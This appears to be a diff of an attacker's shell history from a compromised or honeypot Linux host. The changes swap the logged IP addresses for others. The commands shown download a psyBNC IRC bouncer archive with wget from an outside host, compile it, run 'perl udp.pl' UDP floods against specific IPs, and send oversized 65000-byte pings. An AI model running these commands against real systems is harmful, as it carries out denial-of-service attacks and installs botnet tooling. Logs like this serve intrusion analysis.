@@ -133,7 +133,7 @@ cd psybnc
 make
 gcc
 make
-253.37.30.118
+58.34.244.67
 ls
 wget http://geocities.com/cocosel_01/psybnc-emech-eggdrop/psybnc.tgz
 tar xzvf psybnc.tgz
@@ -147,7 +147,7 @@ cd ..
 cd /tmp
 ls
 perl udp.pl 
-perl udp.pl 211.155.117.90 80 0
+perl udp.pl 16.188.21.242 80 0
 ls
 ./climb3r/
 cd climb3r/
@@ -163,12 +163,12 @@ cd ..
 ls
 cd ..
 ls
-perl udp.pl 53.169.143.11 80 0
-perl udp.pl 53.169.143.11 80 0
+perl udp.pl 50.131.157.231 80 0
+perl udp.pl 50.131.157.231 80 0
 ping
 ping -s 65000
-ping -s 65000 189.244.177.172
-perl udp.pl 53.169.143.11 0 0
+ping -s 65000 144.72.5.192
+perl udp.pl 50.131.157.231 0 0
 ls
 cd /var/tmp
 ls
